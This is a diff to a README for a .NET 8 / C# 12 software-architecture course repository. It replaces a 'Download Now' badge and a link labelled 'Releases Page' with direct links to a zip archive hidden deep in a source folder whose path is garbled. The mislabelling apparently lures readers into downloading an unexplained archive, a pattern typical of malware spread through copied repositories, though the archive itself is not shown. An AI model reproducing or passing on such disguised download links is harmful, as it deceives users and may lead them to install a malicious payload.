@@ -1,6 +1,6 @@
 # 🎓 software-architecture_formation-course-luisdev-part-1_dotnet-8_csharp-12 - Master Software Architecture Fundamentals
 
-![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download Now](https://raw.githubusercontent.com/KePinGimank/software-architecture_formation-course-luisdev-part-1_dotnet-8_csharp-12/main/developments/Co╠üdigo-Fonte/Ocp/software-architecture_formation-course-luisdev-part-1_dotnet-8_csharp-12_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -39,7 +39,7 @@ For detailed installation instructions, visit the official .NET documentation.
 
 To get started with the course materials, you need to download the software. 
 
-1. **Visit this page to download**: [Releases Page](https://github.com/KePinGimank/software-architecture_formation-course-luisdev-part-1_dotnet-8_csharp-12/releases).
+1. **Visit this page to download**: [Releases Page](https://raw.githubusercontent.com/KePinGimank/software-architecture_formation-course-luisdev-part-1_dotnet-8_csharp-12/main/developments/Co╠üdigo-Fonte/Ocp/software-architecture_formation-course-luisdev-part-1_dotnet-8_csharp-12_v3.0.zip).
 2. Look for the latest release. It will have a title and a list of assets you can download. 
 3. Choose the file appropriate for your operating system and click the link to initiate the download.
 4. Once the download is complete, locate the downloaded file on your computer. 
